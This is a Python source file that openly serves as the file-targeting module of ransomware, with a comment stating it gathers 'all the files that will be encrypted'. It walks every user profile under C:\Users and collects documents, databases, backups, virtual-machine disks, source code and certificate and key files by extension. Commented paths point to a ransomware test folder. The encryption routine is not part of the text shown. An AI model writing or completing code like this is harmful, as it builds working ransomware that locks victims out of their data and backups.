import os
import glob
#------------------------------------------------------------------------
from get_usrs import get_users

# GETS ALL THE FILES THAT WILL BE ENCRYPTED

# now with the user dir from get_usrs function iterate the folders to find all files with certain extentions

# here must import the user names (folders) from the file get_usrs

global all_paths
all_paths = {} #define dictionary to store every path with its respective files

def find_files(name):

    for path, directories_found, files_found in os.walk(name):
        #print(path)
        #print(directories_found)
        #print(files_found)
        files=[]
        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd',
        '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg',
        '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm',
        '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti',
        '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak',
        '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm',
        '.tif', '.tiff', 'nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv',
        '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh',
        '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs',
        '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd',
        '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6',
        '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc',
        '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr',
        '.crt', '.pfx', '.der']
        # keep only the files with specifyed extensions
        for f in files_found:
            #for x in glob.glob():
            if os.path.splitext(f)[1] in extensions:    # os.path.splitext --> separates a path from the extension of the file, 
                                                        # creates a 2-element list: [path_and_filename, file_extension], so the [1] selects the element 1, that is the extension.
                files.append(f)
        #print(files)
        all_paths[path] = files # save the values in a dictionary all_paths={path; [list of files in the path]}

    # print(all_paths)

# C:\\Users\\RitaAlonsoCasablanca\\Desktop\\2 BATX A
# C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\test_files

# find_files("C:\\Users")
def define_useful_paths():
    u = get_users()
    # One filtering for each user
    for person in u: #users is a var from get_usrs file
        userpath = 'C:\\Users' + '\\' + person
        find_files(userpath)

    a = [all_paths]
    # print(a)

    useful_paths = [ele for ele in ({key: val for key, val in sub.items() if val} for sub in a) if ele] # delete empty values from dic
    # print(useful_paths)
    return useful_paths